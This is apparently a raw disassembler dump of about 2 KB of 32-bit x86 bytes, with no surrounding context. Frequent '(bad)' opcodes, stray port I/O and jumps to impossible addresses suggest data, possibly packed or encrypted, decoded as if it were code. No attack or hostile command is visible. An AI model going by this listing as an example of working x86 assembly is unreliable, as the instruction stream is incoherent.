  4311a5:	jae    0x431143
  4311a7:	mov    cl,cl
  4311a9:	inc    DWORD PTR [esp]
  4311ac:	push   ebp
  4311ad:	shr    esp,0x8
  4311b0:	in     al,dx
  4311b1:	push   esp
  4311b2:	add    DWORD PTR [eax],esp
  4311b4:	add    bl,cl
  4311b6:	inc    ebp
  4311b7:	mov    bh,0x89
  4311b9:	add    ah,bh
  4311bb:	jmp    0xca752105
  4311c0:	pushf  
  4311c1:	dec    esp
  4311c2:	mov    edx,0xf8178520
  4311c7:	fst    DWORD PTR [ebp+0x0]
  4311ca:	mov    BYTE PTR [eax],0xc4
  4311cd:	sub    edx,DWORD PTR [ebx-0x3f]
  4311d0:	inc    ebp
  4311d1:	add    eax,0xc601da
  4311d6:	mov    al,0xc6
  4311d9:	ins    BYTE PTR es:[edi],dx
  4311da:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4311e1:	dec    esp
  4311e2:	jmp    DWORD PTR [eax]
  4311e4:	inc    ebp
  4311e5:	fnstcw WORD PTR [esi+0x29]
  4311e8:	test   BYTE PTR [eax],0xc8
  4311eb:	rol    BYTE PTR [eax],0xc0
  4311ee:	lea    ecx,[ebp-0x3cf0dbcb]
  4311f4:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4311fa:	inc    esi
  4311fb:	add    DWORD PTR [eax],ebx
  4311fd:	add    dh,bh
  4311ff:	mov    esi,DWORD PTR [edx+0x8]
  431202:	(bad)  
  431203:	fdiv   QWORD PTR ss:[ecx]
  431206:	(bad)  
  431207:	mov    bl,ch
  431209:	add    esi,eax
  43120b:	add    dh,bl
  43120d:	or     esi,eax
  43120f:	mov    dl,0xdf
  431211:	add    esi,eax
  431213:	add    al,ah
  431215:	push   cs
  431216:	mov    BYTE PTR [edx+0xc601e1],0xe2
  43121d:	or     BYTE PTR [ebx],dh
  43121f:	dec    ecx
  431220:	lea    eax,[ebx]
  431222:	xor    eax,0x18fc0fc7
  431227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431228:	repz clc 
  43122a:	add    eax,DWORD PTR [ebp+0x46]
  43122d:	prefetcht0 BYTE PTR [ecx-0x2]
  431231:	xor    eax,0x7c60872
  431236:	mov    esp,0xbd32c69b
  43123b:	pop    esi
  43123c:	mov    cl,0xbe
  43123f:	or     al,0xc6
  431241:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431248:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43124f:	add    dh,al
  431251:	mov    eax,ebx
  431253:	xor    DWORD PTR [ebx],0x35008dbc
  431259:	mov    ecx,DWORD PTR [edi]
  43125b:	sbb    al,0x18
  43125d:	inc    ebp
  43125e:	xrelease mov DWORD PTR [ebx],0x188546f4
  431265:	clc    
  431266:	(bad)  
  431267:	xor    DWORD PTR [edx-0x64],esi
  43126a:	lea    ecx,[ecx+0x45ffe838]
  431270:	mov    ecx,ebx
  431272:	fadd   st,st(6)
  431274:	dec    ebp
  431275:	lds    edi,FWORD PTR [eax+0x7145fc56]
  43127b:	out    0x1,eax
  43127d:	inc    ebp
  43127e:	lea    ebp,ds:0xc8ffc6ff
  431284:	enter  0xa33,0xc6
  431288:	push   ebp
  431289:	leave  
  43128a:	(bad)  
  43128b:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  431291:	add    BYTE PTR [ebp+0x44],al
  431294:	mov    eax,esp
  431296:	mov    WORD PTR [esi+0x46398300],?
  43129c:	psubusw mm4,QWORD PTR [esi-0x78]
  4312a0:	add    BYTE PTR [ebx-0x1303f975],al
  4312a6:	add    BYTE PTR [ebp+0x1],0xeb
  4312aa:	add    BYTE PTR [ebp+0x38],al
  4312ad:	in     eax,dx
  4312ae:	inc    ebp
  4312af:	inc    ebp
  4312b0:	mov    ebx,ebx
  4312b2:	add    BYTE PTR [ebp+0x0],0xec
  4312b6:	mov    DWORD PTR [ebp-0x41],eax
  4312b9:	sub    eax,0x2c00454e
  4312be:	ins    DWORD PTR es:[edi],dx
  4312bf:	inc    ebp
  4312c0:	add    BYTE PTR [esi+0x66],bh
  4312c3:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4312ca:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4312d4:	dec    edi
  4312d5:	pop    es
  4312d6:	add    ah,ch
  4312d8:	mov    DWORD PTR [ebp+0x68],eax
  4312db:	in     eax,dx
  4312dc:	inc    DWORD PTR [ebp-0x7d]
  4312df:	out    0xc0,al
  4312e1:	inc    ebp
  4312e2:	mov    edx,esp
  4312e4:	push   0x45
  4312e6:	(bad)  
  4312e7:	jmp    0xdf9258a4
  4312ec:	add    BYTE PTR [ebp-0x77],al
  4312ef:	out    dx,al
  4312f0:	ins    BYTE PTR es:[edi],dx
  4312f1:	inc    ebp
  4312f2:	jmp    edi
  4312f4:	add    DWORD PTR [ebp-0x14],0x7e
  4312f8:	mov    esi,esi
  4312fa:	outs   dx,BYTE PTR ds:[esi]
  4312fb:	inc    esp
  4312fc:	(bad)  
  4312fd:	mov    esp,0x8341b68d
  431302:	mov    DWORD PTR [esi+0x70],eax
  431305:	fcos   
  431307:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  43130d:	in     al,dx
  43130e:	jb     0x431295
  431310:	(bad)  
  431311:	dec    DWORD PTR [ebx-0x7aba9901]
  431317:	mov    edi,edi
  431319:	fdivr  st,st(7)
  43131b:	out    dx,eax
  43131c:	rcl    BYTE PTR [ebx],0x66
  43131f:	mov    DWORD PTR [ebp-0xc70075],eax
  431325:	(bad)  
  431326:	std    
  431327:	cmp    eax,DWORD PTR [eax]
  431329:	jne    0x431391
  43132b:	mov    DWORD PTR [ebp-0xba0048],eax
  431331:	in     al,dx
  431332:	outs   dx,BYTE PTR ds:[esi]
  431333:	pushf  
  431334:	add    BYTE PTR [ebx-0x7f7a039a],cl
  43133a:	inc    DWORD PTR [ecx]
  43133c:	inc    DWORD PTR [eax]
  43133e:	jae    0x431378
  431340:	add    BYTE PTR [ebp+0x850266],al
  431346:	inc    DWORD PTR [ebp-0x1]
  431349:	mov    eax,eax
  43134b:	jl     0x4313b3
  43134d:	add    BYTE PTR [ebp-0x740077],al
  431353:	cld    
  431354:	dec    eax
  431355:	add    BYTE PTR [eax],0x1
  431358:	data16 add BYTE PTR [ebp+0x38],al
  43135c:	mov    eax,0x47c2
  431361:	mov    eax,0x824f89
  431366:	inc    edi
  431367:	mov    DWORD PTR [edx+0x64],ebp
  43136a:	inc    WORD PTR [ebp-0x75]
  43136e:	(bad)  
  43136f:	data16 rol BYTE PTR [ebp-0x16001a],1
  431376:	inc    ebp
  431377:	jge    0x431358
  431379:	add    bh,ah
  43137b:	lea    ax,[ebp-0x750030]
  431382:	add    al,0x46
  431385:	jmp    0x40ff:0x8885
  43138b:	push   DWORD PTR [ebp+0x52]
  43138e:	lea    eax,[eax]
  431390:	shl    BYTE PTR [esi-0x7b],1
  431393:	test   esi,edi
  431395:	(bad)  
  431396:	(bad)  
  431397:	inc    DWORD PTR [ebp-0x990140]
  43139d:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  4313a3:	inc    edi
  4313a4:	push   ecx
  4313a5:	xor    ax,WORD PTR [ebp-0x8d0045]
  4313ac:	add    al,al
  4313ae:	ret    
  4313af:	mov    ax,WORD PTR [ebp-0x3f0004]
  4313b6:	push   eax
  4313b7:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4313be:	add    BYTE PTR [ebx-0x764f8839],al
  4313c4:	push   DWORD PTR [esi+0x1]
  4313c7:	inc    DWORD PTR [eax]
  4313c9:	mov    eax,0xff99ff
  4313ce:	or     BYTE PTR [ecx-0x7a87bb],cl
  4313d4:	jne    0x43138e
  4313d6:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4313e0:	mov    ecx,0xd74fb8
  4313e5:	add    cl,al
  4313e7:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4313ed:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4313f4:	(bad)  
  4313f5:	push   ebp
  4313f7:	mov    eax,0x8c2789
  4313fc:	ret    0x6689
  4313ff:	adc    BYTE PTR [ebp+0x48],0x8d
  431403:	add    bh,ah
  431405:	mov    WORD PTR [ebp-0x70],ax
  431409:	(bad)  
  43140a:	ret    0x667d
  43140d:	or     BYTE PTR [ebp-0x77],dl
  431410:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431417:	loop   0x4313a2
  431419:	(bad)  
  43141a:	xchg   esi,eax
  43141b:	aam    0xcf
  43141d:	out    dx,al
  43141e:	mov    DWORD PTR [esi-0x68],edi
  431421:	inc    ebp
  431422:	dec    edx
  431423:	pop    ecx
  431424:	mov    edx,DWORD PTR [eax]
  431426:	repnz push bp
  431429:	or     BYTE PTR [ebx+0x55106638],0x49
  431430:	(bad)  
  431431:	repnz xor eax,0xa0898945
  431437:	mov    ah,0x89
  431439:	jmp    DWORD PTR [edx+0x66b0418d]
  43143f:	inc    DWORD PTR [ebp+0x50]
  431442:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431446:	mov    DWORD PTR [eax],ecx
  431448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431449:	pop    es
  43144a:	inc    ecx
  43144b:	(bad)  
  43144c:	data16 fwait
  43144e:	inc    ebp
  43144f:	xor    ah,BYTE PTR [esi+0x3]
  431452:	dec    ebp
  431453:	push   eax
  431454:	inc    bp
  431456:	jge    0x4313db
  431458:	mov    esp,DWORD PTR [esi-0x18]
  43145b:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431461:	add    DWORD PTR [ebx],esi
  431463:	add    BYTE PTR [ebx],al
  431465:	test   DWORD PTR [ebx],esi
  431467:	(bad)  
  431468:	inc    WORD PTR [ebp+0x0]
  43146c:	mov    eax,DWORD PTR [eax]
  43146e:	call   0x8898cba3
  431473:	mov    esi,eax
  431475:	clc    
  431476:	ret    
  431477:	rol    cl,0xa
  43147a:	mov    DWORD PTR ds:0x7c0ec88,esi
  431480:	mov    edx,edi
  431482:	pushf  
  431483:	pop    es
  431484:	jmp    FWORD PTR [edx+0x66]
  431487:	add    BYTE PTR [ebp-0x990175],al
  43148d:	inc    ebp
  43148e:	test   DWORD PTR [ebx-0x2f00f202],eax
  431494:	push   ebp
  431495:	mov    edi,eax
  431497:	mov    dh,BYTE PTR [eax+0x266ff51]
  43149d:	push   ebp
  43149e:	add    BYTE PTR [ebx-0x764b0777],al
  4314a4:	dec    DWORD PTR [esi+0x661851e8]
  4314aa:	add    BYTE PTR [ebp-0x7b],dl
  4314ad:	cmp    esi,0xfffffffb
  4314b0:	dec    DWORD PTR [ecx+0x51fe9285]
  4314b6:	jmp    DWORD PTR [esi-0x75]
  4314b9:	push   ebp
  4314ba:	hlt    
  4314bb:	data16 (bad) 
  4314bd:	dec    ebp
  4314be:	ret    
  4314bf:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4314c5:	lea    edx,[eax-0x1]
  4314c8:	jne    0x43149b
  4314ca:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4314d0:	dec    BYTE PTR [ecx+0x51559eff]
  4314d6:	mov    DWORD PTR [esi-0x4c],esp
  4314d9:	push   ebp
  4314da:	jmp    DWORD PTR [esi-0x18]
  4314dd:	inc    ebp
  4314de:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4314e4:	(bad)  
  4314e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4314e6:	inc    eax
  4314e8:	test   DWORD PTR [esi-0x2],esp
  4314eb:	inc    ebp
  4314ec:	dec    DWORD PTR [ebp-0x760bde75]
  4314f2:	(bad)  
  4314f3:	test   al,0xc3
  4314f5:	mov    DWORD PTR [ebp-0x769b56],ecx
  4314fb:	lods   al,BYTE PTR ds:[esi]
  4314fc:	push   eax
  4314fd:	inc    ebp
  4314fe:	jne    0x43150f
  431500:	dec    DWORD PTR [ebp+0x8]
  431503:	mov    ecx,DWORD PTR [ebx]
  431505:	sbb    al,0x0
  431507:	(bad)  
  431508:	mov    eax,0xc14fc3
  43150d:	mov    DWORD PTR [ecx-0xbabf64],ecx
  431513:	movsx  ecx,WORD PTR [ebp+0x4e]
  431517:	xor    eax,DWORD PTR [eax]
  431519:	add    eax,edi
  43151b:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  431521:	xor    edi,DWORD PTR [eax+0x854f66]
  431527:	dec    BYTE PTR [ecx-0x76bb01]
  43152d:	mov    BYTE PTR [ebx-0x76724001],al
  431533:	pushf  
  431534:	inc    esi
  431535:	(bad)  
  431536:	dec    DWORD PTR [ebp-0x7abe6373]
  43153c:	sar    esi,0x89
  43153f:	dec    DWORD PTR [eax+0x0]
  431542:	inc    DWORD PTR [eax]
  431544:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  43154b:	xlat   BYTE PTR ds:[ebx]
  43154c:	dec    edx
  43154d:	add    bh,bh
  43154f:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431555:	lea    esp,[esi-0x50]
  431558:	(bad)  
  431559:	(bad)  
  43155a:	call   DWORD PTR [eax-0x1]
  43155d:	inc    ebp
  43155e:	rdpmc  
  431560:	add    BYTE PTR [ebx],al
  431562:	push   ax
  431564:	lea    eax,[ebp-0x1]
  43156a:	js     0x43156b
  43156c:	add    al,bh
  43156e:	push   bp
  431570:	lea    ecx,[ebp-0x7701]
  431576:	fmul   DWORD PTR [ebp-0x7a997800]
  43157c:	(bad)  
  43157d:	(bad)  
  43157e:	(bad)  
  43157f:	(bad)  
  431580:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431586:	dec    eax
  431587:	mov    eax,0x8d8dffff
  43158c:	mov    al,0xb0
  43158e:	(bad)  
  43158f:	call   DWORD PTR [ecx+0x50]
  431592:	dec    ebp
  431593:	inc    ebp
  431594:	mov    esi,0x7030833
  431599:	push   eax
  43159a:	into   
  43159b:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  4315a1:	call   DWORD PTR [ecx-0x8]
  4315a4:	lea    edx,[ebp-0x1]
  4315a7:	jmp    0x7617ab
  4315ac:	inc    eax
  4315ad:	jnp    0x43153c
  4315af:	add    dh,bh
  4315b1:	inc    WORD PTR [ebp-0x8a00b0]
  4315b8:	mov    edx,eax
  4315ba:	inc    esp
  4315bb:	add    bh,bh
  4315bd:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4315c3:	dec    DWORD PTR [ebx-0x7f820301]
  4315c9:	add    BYTE PTR [ecx],al
  4315cb:	data16 add BYTE PTR [ebp-0xb30077],al
  4315d2:	inc    eax
  4315d4:	(bad)  
  4315d5:	dec    si
  4315d7:	test   edi,edi
  4315d9:	(bad)  
  4315da:	cmp    edi,edi
  4315dc:	add    ecx,DWORD PTR [edi-0x39]
  4315df:	mov    edx,DWORD PTR [edx+0x66]
  4315e2:	inc    DWORD PTR [ebp-0x3d00cb]
  4315e8:	mov    eax,0x66ff8b5e
  4315ee:	jmp    0xb4ff:0xc7ff3895
  4315f5:	push   ecx
  4315f6:	inc    DWORD PTR [ebx-0x76ffccbb]
  4315fc:	call   DWORD PTR [esi-0x1]
  4315ff:	dec    DWORD PTR [eax]
  431601:	mov    ecx,0x805ff
  431606:	inc    ebp
  431607:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  43160d:	mov    ecx,0x35784
  431612:	add    BYTE PTR [ecx-0xffa59b],cl
  431618:	inc    ebp
  431619:	mov    ecx,0x9c6131
  43161e:	(bad)  
  43161f:	mov    eax,ebx
  431621:	pop    esp
  431622:	test   edi,edi
  431624:	clc    
  431625:	lea    eax,[ebp-0x24]
  431628:	cmp    eax,0xc7fe9c8d
  43162d:	push   eax
  43162f:	lea    eax,[ebp+0x45fff8fe]
  431635:	mov    esi,DWORD PTR [ecx]
  431637:	hlt    
  431638:	lahf   
  431639:	push   esp
  43163a:	mov    edx,DWORD PTR [ecx-0x4]
  43163d:	xor    eax,DWORD PTR [eax+0x7201bb]
  431643:	add    BYTE PTR [ebp-0x35],al
  431646:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  43164c:	mov    edx,DWORD PTR [ecx-0x74]
  43164f:	rol    BYTE PTR [eax],0x8d
  431652:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431656:	nop
  431657:	push   ecx
  431658:	add    bh,bh
  43165a:	mov    esp,edi
  43165c:	in     al,0x85
  43165e:	jge    0x43165e
  431660:	test   edi,edi
  431662:	jne    0x4315e9
  431664:	(bad)  
  431665:	(bad)  
  431666:	sbb    bh,bh
  431668:	push   ebp
  431669:	inc    ebp
  43166a:	call   0xffdc10fa
  43166f:	add    BYTE PTR [ebp+0x66],al
  431672:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431678:	cmp    al,0x85
  43167a:	ud0    eax,DWORD PTR [ebp-0x1]
  43167e:	test   DWORD PTR [edi+0x74],ecx
  431681:	dec    edi
  431682:	inc    DWORD PTR [ebp-0x50004]
  431688:	dec    DWORD PTR [edi-0x75]
  43168b:	dec    esi
  43168c:	cld    
  43168d:	test   DWORD PTR [eax+0xff01ff],eax
  431693:	icebp  
  431694:	add    BYTE PTR [edi-0x3a],cl
  431697:	test   ebx,eax
  431699:	inc    BYTE PTR [ebp-0x1]
  43169c:	jne    0x43169e
  43169e:	mov    eax,DWORD PTR [eax]
  4316a0:	cld    
  4316a1:	xor    BYTE PTR [ecx+0x500155],cl
  4316a7:	push   ebp
  4316a8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4316ae:	add    BYTE PTR [ebp+0x35e90f50],al
  4316b4:	add    al,BYTE PTR [eax]
  4316b6:	add    BYTE PTR [ebx-0x38fe4f80],al
  4316bc:	add    ah,ch
  4316be:	or     BYTE PTR [ebp+0x4501f845],dh
  4316c4:	jmp    0xdf19ba
  4316c9:	(bad)  
  4316ca:	nop    ecx
  4316cd:	test   DWORD PTR [ebp+0x4502f8],eax
  4316d3:	xor    ecx,DWORD PTR [ebp-0x64]
  4316d6:	mov    eax,edi
  4316d8:	mov    ebx,DWORD PTR [eax+edx*2]
  4316db:	add    eax,0x45fef885
  4316e0:	dec    DWORD PTR [ebx+0x339445]
  4316e6:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4316ec:	dec    DWORD PTR [ebx-0x460f0375]
  4316f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4316f3:	add    esi,edi
  4316f5:	add    bh,bh
  4316f7:	rdpmc  
  4316f9:	add    BYTE PTR [ebx],0x1
  4316fc:	mov    DWORD PTR [eax],eax
  4316fe:	add    al,0x45
  431700:	dec    DWORD PTR [ecx-0x360b3373]
  431706:	dec    DWORD PTR [esi]
  431708:	push   eax
  431709:	jne    0x431750
  43170b:	mov    esi,DWORD PTR [ebx]
  43170d:	cld    
  43170e:	add    esp,ecx
  431710:	push   eax
  431711:	inc    DWORD PTR [ebp-0x75]
  431714:	add    eax,0x800e4
  431719:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43171f:	mov    DWORD PTR [ecx],eax
  431721:	sbb    al,0x0
  431723:	leave  
  431724:	test   DWORD PTR [edi-0x2],eax
  431727:	jne    0x431728
  431729:	call   0xff44012e
  43172e:	xor    BYTE PTR [ebp+0x4d],al
  431731:	mov    edi,edi
  431733:	enter  0x8,0x4d
  431737:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43173d:	mov    eax,DWORD PTR [eax]
  43173f:	cld    
  431740:	add    DWORD PTR [ecx],ebx
  431742:	inc    ebp
  431743:	dec    ebp
  431744:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43174a:	inc    eax
  43174b:	dec    DWORD PTR [ecx-0x270375]
  431751:	add    BYTE PTR [ebx-0x39d72701],cl
  431757:	xchg   ecx,eax
  431758:	ret    
  431759:	add    BYTE PTR [ebp-0x830075],al
  43175f:	add    BYTE PTR [ebp-0x75],al
  431762:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431768:	lea    edi,[edi-0xc]
  43176b:	add    bh,bh
  43176d:	mov    edx,DWORD PTR [eax-0x7b]
  431770:	inc    ebp
  431771:	rdpmc  
  431773:	jne    0x431778
  431775:	add    BYTE PTR [eax-0x75],dl
  431778:	inc    ebp
  431779:	clc    
  43177a:	add    eax,0x400009
  43177f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431785:	mov    eax,DWORD PTR [ecx]
  431787:	in     al,dx
  431788:	add    dh,al
  43178a:	test   ebx,eax
  43178c:	inc    BYTE PTR [ebp-0xff0001]
  431792:	add    BYTE PTR [ebp-0x43],al
  431795:	cmp    esi,0xfffffff8
  431798:	(bad)  
  431799:	push   DWORD PTR [eax]
  43179b:	add    BYTE PTR [ebp-0x3a],dl
  43179e:	test   ebx,eax
  4317a0:	je     0x431727
  4317a2:	mov    edi,edi
  4317a4:	sbb    al,0xff
  4317a6:	test   DWORD PTR gs:[eax],eax
  4317a9:	(bad)  
  4317aa:	js     0x4317ab
  4317ac:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4317b2:	sub    eax,ebx
  4317b4:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4317ba:	add    eax,DWORD PTR [eax]
  4317bc:	dec    ebp
  4317bd:	push   eax
  4317be:	mov    al,BYTE PTR [ebp+0x1]
  4317c1:	mov    eax,DWORD PTR [ebp-0x68]
  4317c4:	mov    eax,DWORD PTR [eax]
  4317c6:	sbb    bh,al
  4317c8:	or     ah,dh
  4317ca:	dec    ebp
  4317cb:	inc    DWORD PTR [eax+0x4]
  4317ce:	push   ecx
  4317cf:	add    BYTE PTR [edx-0x1],dh
  4317d2:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4317d8:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4317e2:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4317e8:	push   ecx
  4317e9:	cmp    BYTE PTR [ebx],al
  4317eb:	inc    ebp
  4317ec:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4317f2:	(bad)  
  4317f3:	(bad)  
  4317f4:	in     al,0xff
  4317f6:	add    BYTE PTR [ebp+0x0],al
  4317f9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4317ff:	add    al,bh
  431801:	(bad)  
  431802:	jmp    0x8d85:0x74b0558d
  431809:	dec    DWORD PTR [eax]
  43180b:	call   DWORD PTR [ebp-0x7b]
  43180e:	mov    edi,esi
  431810:	lock call DWORD PTR [ebp-0x75]
  431814:	mov    esi,esp
  431816:	mov    ah,0xc6
  431818:	mov    bh,0xc3
  43181a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  431820:	add    DWORD PTR [eax],0x450050ff
  431826:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43182c:	inc    edi
  43182e:	push   esp
  431830:	jmp    0xcd00:0x650481ff
  431837:	mov    DWORD PTR [ebx],esi
  431839:	clc    
  43183a:	cmp    edi,0xff9cff3c
  431840:	jne    0x43184a
  431842:	mov    eax,eax
  431844:	add    esi,DWORD PTR [eax]
  431846:	int3   
  431847:	inc    ebp
  431848:	cmp    al,0x83
  43184a:	add    BYTE PTR [eax],bl
  43184c:	adc    DWORD PTR [ebx+0x768b5055],eax
  431852:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431858:	mov    edi,eax
  43185a:	cmp    BYTE PTR [ebp+0x45],cl
  43185d:	jmp    0x4317ea
  43185f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431862:	inc    ebp
  431863:	or     al,0x2
  431865:	dec    DWORD PTR [ebp+0x18]
  431868:	jne    0x4318bf
  43186a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  431870:	mov    edi,DWORD PTR [ebx]
  431872:	in     al,0x50
  431874:	xchg   ecx,eax
  431875:	jmp    0x343677a
  43187a:	adc    al,0x8b
  43187c:	inc    ebp
  43187d:	mov    al,ds:0x8b04008b
  431882:	push   ebp
  431883:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431889:	push   ebp
  43188a:	test   DWORD PTR [ebx-0x2800d701],ecx
  431890:	inc    ebp
  431891:	dec    ebp
  431892:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431898:	mov    DWORD PTR [eax],0xe9ff00f4
  43189e:	add    al,0x0
  4318a0:	add    BYTE PTR [eax],al
  4318a2:	mov    eax,edx
  4318a4:	push   eax
  4318a5:	rol    DWORD PTR [ebp-0xf0177],1
  4318ab:	bound  eax,QWORD PTR [ebp+0x50]
  4318ae:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4318b4:	add    BYTE PTR [ecx+0x558df0ff],cl
  4318ba:	mov    al,0xf
  4318bc:	test   DWORD PTR [edx],edx
  4318be:	call   DWORD PTR [ebp-0x7a0001]
  4318c4:	(bad)  
  4318c5:	loop   0x4318c6
  4318c7:	jnp    0xc6990ccd
  4318cd:	mov    eax,ebx
  4318cf:	cmp    al,0x8b
  4318d1:	(bad)  
  4318d2:	cld    
  4318d3:	shr    esi,0xc
  4318d6:	add    dl,al
  4318d8:	push   eax
  4318d9:	lea    eax,[ebp-0x1]
  4318dc:	mov    edx,esi
  4318de:	cwde   
  4318df:	cli    
  4318e0:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4318e6:	or     BYTE PTR [eax],cl
  4318e8:	inc    ebp
  4318e9:	dec    ebp
  4318ea:	inc    DWORD PTR [ebx+0x74803914]
  4318f0:	add    DWORD PTR [ebx+0x451800],ecx
  4318f6:	call   DWORD PTR [eax+edx*1]
  4318f9:	add    ecx,DWORD PTR [ebp-0x34]
  4318fc:	push   edi
  4318fd:	adc    al,0x8
  4318ff:	mov    edx,DWORD PTR [ebp-0x14]
  431902:	mov    ecx,DWORD PTR [ebp+0x18]
  431905:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431909:	inc    DWORD PTR [eax+esi*8]
  43190c:	inc    ebp
  43190d:	stos   BYTE PTR es:[edi],al
  43190e:	mov    edx,DWORD PTR [ebp-0x4]
  431911:	add    DWORD PTR [ebp-0x1c],eax
  431914:	mov    edx,DWORD PTR [ebp-0x70]
  431917:	cmp    eax,DWORD PTR [eax]
  431919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43191a:	mov    eax,DWORD PTR [eax]
  43191c:	cld    
  43191d:	jae    0x43189f
  43191f:	add    eax,DWORD PTR [ecx]
  431921:	clc    
  431922:	add    BYTE PTR [eax+0x30],dl
  431925:	mov    DWORD PTR [ecx],esi
  431927:	clc    
  431928:	pop    ds
  431929:	inc    ebp
  43192a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  431930:	(bad)  
  431931:	push   DWORD PTR [edi]
  431933:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431939:	(bad)  
  43193a:	jae    0x43193b
  43193c:	mov    eax,DWORD PTR [ebp-0x740175]
  431942:	sub    eax,DWORD PTR [eax]
  431944:	add    eax,DWORD PTR [eax]
  431946:	mov    DWORD PTR [ecx+0x5f],eax
  431949:	mov    DWORD PTR [ebx-0x4],ebx
  43194c:	ret    0xff
  43194f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431955:	ret    
  431956:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43195c:	add    BYTE PTR [ebp-0x7d],al
  43195f:	mov    DWORD PTR [eax],eax
  431961:	add    al,0x84
  431963:	inc    DWORD PTR [ecx]
  431965:	lea    eax,[eax]
  431967:	hlt    
  431968:	sar    bh,cl
  43196a:	test   BYTE PTR [eax+0x1],dl
  43196d:	inc    ebp
  43196e:	add    BYTE PTR [ebx],dh
  431970:	test   BYTE PTR [ebx],0x84
  431973:	push   eax
  431974:	add    BYTE PTR [ebp+0x0],al
  431977:	add    eax,0x86
  43197c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  431982:	add    BYTE PTR [ecx],al
  431984:	add    BYTE PTR [eax],al
  431986:	mov    esi,0x550030
  43198b:	mov    ecx,DWORD PTR [edi]
  43198d:	cld    
  43198e:	fidiv  DWORD PTR [ebp+0x0]
  431991:	mov    edi,DWORD PTR [ecx]
  431993:	xor    BYTE PTR [eax+eax*1],0x84
  431997:	add    eax,DWORD PTR [eax]
  431999:	sbb    BYTE PTR [eax],al
  43199b:	jne    0x43194e
  43199d:	mov    eax,DWORD PTR [ecx]
  43199f:	sbb    BYTE PTR [eax],al
  4319a1:	mov    DWORD PTR [ebp-0x1],esp
  4319a4:	add    BYTE PTR [eax+0x30e45ca],bh
  4319aa:	ret    0xb7fc
  4319ad:	dec    ebp
  4319ae:	or     al,0x89
  4319b0:	dec    ebp
  4319b1:	cld    
  4319b2:	cmovne ecx,DWORD PTR [eax-0x75]
  4319b6:	add    edi,esp
  4319b8:	seto   BYTE PTR [esi-0x72ffffff]
  4319bf:	inc    ebp
  4319c0:	adc    al,0x8b
  4319c2:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4319c9:	cmp    DWORD PTR [edi+0x72],edx
  4319cc:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4319d2:	gs cmp al,0x0
  4319d5:	je     0x4319ad
  4319d7:	push   eax
  4319d8:	sar    BYTE PTR [eax],1
  4319da:	mov    bh,0x3e
  4319dc:	push   cs
  4319dd:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4319e3:	add    DWORD PTR [ecx+0x12],ebp
  4319e6:	dec    edx
  4319e7:	(bad)  
  4319e8:	mov    eax,edx
  4319ea:	in     al,dx
  4319eb:	adc    DWORD PTR [ecx],esi
  4319ed:	pop    esi
  4319ee:	inc    ecx
  4319ef:	leave  
  4319f0:	or     DWORD PTR [eax],ebx
  4319f2:	gs push ebp
  4319f4:	add    ah,ch
  4319f6:	into   
  4319f7:	in     al,dx
  4319f8:	enter  0xb756,0xf0
  4319fc:	push   cs
